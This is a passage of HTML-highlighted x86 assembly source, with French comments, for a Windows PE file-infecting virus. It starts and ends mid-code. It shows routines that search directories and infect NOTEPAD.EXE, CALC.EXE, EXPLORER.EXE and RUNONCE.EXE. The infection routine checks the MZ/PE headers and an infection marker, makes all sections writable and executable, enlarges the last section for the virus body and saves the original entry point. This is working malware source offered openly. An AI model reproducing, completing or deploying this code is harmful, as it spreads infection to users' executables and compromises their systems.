    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; = ZeroMemory sur filename</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; adresse de notre structure</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SearchHandle</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; le handle</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AFindNextFileA</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">; ;)</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; Y en a plus ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">encore</span><span class="sc0">              </span><span class="sc1">; si ! on repart ‡ l'infection ;)</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">; bye</span><span class="sc0">

</span><span class="sc5">nofile</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Infecte_Dir</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;===============================================================================</span><span class="sc0">
</span><span class="sc1">;   InfecteWinFiles PROC</span><span class="sc0">
</span><span class="sc1">;   Infects files in the windows directory</span><span class="sc0">
</span><span class="sc1">;===============================================================================</span><span class="sc0">

</span><span class="sc5">InfecteWinFiles</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Win_Dir</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AGetWindowsDirectoryA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; eax pointe la structure</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.FileName</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; edi pointe FileName</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">copie_dans_struct</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Copie le chemin de windows</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">concatene</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">copie_dans_struct</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">concatene</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; Rajoute le nom du fichier</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; INFECTE NOTEPAD               ;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">            </span><span class="sc1">; sauve le pointeur edi dans edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">             </span><span class="sc1">; taille ‡ copier</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lenotepad</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; ESI pointe "\NOTEPAD.EXE",0</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; concatËne</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; sauve EDX</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfectMe</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Mouhahahahhahaha</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; ET un notepad de vÈrolÈ</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; restaure EDX</span><span class="sc0">

</span><span class="sc1">; INFECTE CALC</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">; replace edi aprËs le chemin de windows</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lecalc</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; ESI pointe "\CALC.EXE",0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">             </span><span class="sc1">; taille ‡ copier</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; concatËne</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; sauve EDX</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfectMe</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Mouhahahahhahaha</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Et un Calc qui s'en prend plein le PE</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; restaure EDX</span><span class="sc0">

</span><span class="sc1">; INFECTE EXPLORER</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">; replace edi aprËs le chemin de windows</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">leexplorer</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; ESI pointe "\EXPLORER.EXE",0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">             </span><span class="sc1">; taille ‡ copier</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; concatËne</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; sauve EDX</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfectMe</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Mouhahahahhahaha</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Et un Explorer qui s'en prend plein le PE</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; restaure EDX</span><span class="sc0">

</span><span class="sc1">; INFECTE RUNONCE</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Sys_Dir</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AGetSystemDirectoryA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; eax pointe la structure</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.FileName</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; edi pointe FileName</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">copie_sys_dans_struct</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Copie le chemin de windows</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">infectrunonce</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">copie_sys_dans_struct</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">infectrunonce</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">             </span><span class="sc1">; taille ‡ copier</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lerunonce</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; ESI pointe "\RUNONCE.EXE",0</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; concatËne</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfectMe</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Mouhahahahhahaha</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; ET un runonce de vÈrolÈ</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">InfecteWinFiles</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;===============================================================================</span><span class="sc0">
</span><span class="sc1">;   InfectMe PROC</span><span class="sc0">
</span><span class="sc1">;   Infect a file specified in search.FileName</span><span class="sc0">
</span><span class="sc1">;===============================================================================</span><span class="sc0">

</span><span class="sc5">InfectMe</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SehError</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; On place un SEH</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; pour Èviter les plantages</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; edi pointe la structure</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.FileName</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACreateFileA</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">GENERIC_READ</span><span class="sc4">+</span><span class="sc5">GENERIC_WRITE</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">OPEN_EXISTING</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; On ouvre le fichier et on vÈrifie</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">impossible</span><span class="sc0">          </span><span class="sc1">; qu'il n'y a pas d'erreurs</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; PrÈpare l'allocation de mÈmoire</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AGetFileSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">TAILLE_VIRUS</span><span class="sc0">       </span><span class="sc1">; + taille du virus</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Fsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;---Alloue un espace memoire et inscrit le fichier dedans--------------</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ALocalAlloc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">LPTR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; RÈserve de la mÈmoire</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; EDI = pointeur sur cette zone</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">byteread</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AReadFile</span><span class="sc4">],[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Fsize</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;lecture du fichier</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;---cherche la prÈsence d'un MZ Header puis PE Header------------------</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">     </span><span class="sc1">; verification s'il s'agit bien d'un EXE</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">impossible</span><span class="sc0">          </span><span class="sc1">; Si erreur, on s'Èchappe</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; adresse de l'adresse du PE Header</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">            </span><span class="sc1">; ebx pointe sur le PE Header</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">     </span><span class="sc1">; verification s'il s'agit d'un PE Executable</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">impossible</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">');'</span><span class="sc0">    </span><span class="sc1">; vÈrifie que c'est pas dÈj‡ infectÈ</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">impossible</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">; ECX = adresse du PeHeader</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">            </span><span class="sc1">; EBX = adresse du PeHeader</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; nombre de sections dans edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">80</span><span class="sc4">],</span><span class="sc5">TAILLE_VIRUS</span><span class="sc0">  </span><span class="sc1">; on rÈajuste size_of_image</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">248</span><span class="sc0">            </span><span class="sc1">; ecx pointe le section header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">secheader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; sauve cette valeur</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">; nombre de section dans eax</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">characboucle</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E0000020h</span><span class="sc0">  </span><span class="sc1">; Characterics : read/write/exec</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">             </span><span class="sc1">; prochaine section</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; compteur</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; fini ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">characboucle</span><span class="sc0">            </span><span class="sc1">; sinon on boucle</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">             </span><span class="sc1">; ECX POINTE SUR LA DERNIERE SECTION.</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; raw size dans eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; et dans edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc5">TAILLE_VIRUS</span><span class="sc0">  </span><span class="sc1">; ajuste la raw size</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; EntryPoint = VirtualOffset+RawSize originale</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; endroit o˘ copier le virus = RawSize+RawOffset</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">return</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">       </span><span class="sc1">; sauve Le point d'entrÈe du virus (start:)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; nouvelle raw size</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">      </span><span class="sc1">; VirtualSize = SizeOfRawData</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; ancien EntryPoint</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AENTRYPOINT</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">; on sauve l'ancien EntryPoint original</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
